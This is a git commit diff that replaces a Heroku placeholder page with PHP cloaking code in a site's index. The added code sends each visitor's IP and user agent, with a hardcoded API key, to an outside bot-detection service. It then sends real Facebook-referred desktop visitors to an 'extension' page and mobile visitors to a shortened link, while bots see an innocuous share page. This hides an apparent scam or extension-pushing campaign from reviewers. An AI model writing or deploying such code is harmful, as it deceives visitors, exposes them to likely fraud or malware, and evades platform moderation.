5017c5d67c3502a15e801d9f3302578c12adfb5c
sanernecro <sanernecro@gmail.com>
2016-11-02 22:48:30 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,90 +1,55 @@
+<?php
 
-<!DOCTYPE html>
-    <html>
-    <head>
-      <title>Heroku | No such app</title>
-      <style type='text/css'>
-      body {
-        background-color: white;
-        color: #333333;
-          font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 36px;
-        line-height: 1;
-        font-size: 14px; }
+require_once("config.php");
+require_once("functions.php");
 
-      .section {
-        margin-bottom: 36px; }
-        .section.friendly {
-          color: #222222; }
-          .section.friendly h1 {
-            font-size: 26px;
-            background-color: #dad8e4;
-            padding: 18px 22px 15px 22px;
-            margin: 0;
-            overflow: hidden; }
-            .section.friendly h1 strong {
-              display: inline-block;
-              float: left; }
-            .section.friendly h1 small {
-              display: inline-block;
-              float: right;
-              text-align: right;
-              font-size: 18px;
-              padding-top: 4px;
-              color: #333333; }
-          .section.friendly .article {
-            border: 4px solid #dad8e4;
-            padding: 24px 18px 18px 18px; }
-            .section.friendly .article h3 {
-              font-size: 20px;
-              margin: 0 0 18px 0; }
-            .section.friendly .article a {
-              color: #6b6ceb; }
-              .section.friendly .article a:visited {
-                color: #1d1d3b; }
-            .section.friendly .article p {
-              font-size: 14px; }
-            .section.friendly .article ul {
-              list-style-type: square; }
-      .section.original {
-        background-color: #eeeeee;
-        color: #444444; }
-        .section.original h2 {
-          background-color: #dddddd;
-          margin: 0;
-          padding: 18px 22px 18px 22px;
-          font-size: 20px; }
-        .section.original pre {
-          margin: 0;
-          padding: 18px 22px 18px 22px;
-          overflow: auto;
-          font-family: monaco, monospaced; }
-          .section.original pre code {
-            display: block;
-            font-size: 11px;
-            width: 100%; }
-    </style>
-      <script type="text/javascript">
-var _gaq = _gaq || [];
-_gaq.push(['_setAccount', ', UA-2989055-7']);
-_gaq.push(['_setDomainName', '.heroku.com']);
-_gaq.push(['_trackPageview']);
-(function() {
-var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-})();
-</script>
-    </head>
-    <body>
-        <div class='container'>
-          <div class='section friendly'>
-            <h1><strong>Heroku | No such app</strong></h1>
-            <div class='article'>
-              <p>There is no app configured at that hostname.<br/>Perhaps the app owner has renamed it, or you mistyped the URL.</p>
-            </div>
-          </div>
-        </div>
-    </body>
-    </html>
+$ch = curl_init();
+curl_setopt_array($ch, array(
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'http://tracking.redirect.pub/api/isBot?api_key=51fa5653d1986420acfc567f4a9826ac&i='.$_SERVER["REMOTE_ADDR"].'&u='.$_SERVER["HTTP_USER_AGENT"]
+));
+$api = curl_exec($ch);
+curl_close($ch);
+$isref = false;
+
+
+$data = json_decode($api);
+
+$theme = "none";
+$mobile = "https://goo.gl/TdR8a3";
+
+if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
+    $isref = true;
+}
+
+if ($data->status == "true" && $data->device_type == "desktop" && $isref == true) {
+
+  $theme = "extension";
+
+}
+
+if ($data->status == "true" && $data->device_type == "mobile") {
+
+  $theme = "mobile";
+
+}
+
+if ($theme == "extension") {
+
+  if(strpos($_SERVER["HTTP_HOST"], $app_site) === false){
+    header("Location: http://".$app_site."/".rand(1000000, 999999999));
+  } else {
+    require_once('extension.php');
+  }
+  exit;
+
+} else if ($theme == "mobile") {
+
+  header("Location: ".$mobile);
+  exit;
+
+} else {
+
+  require_once('share.php');
+  exit;
+}
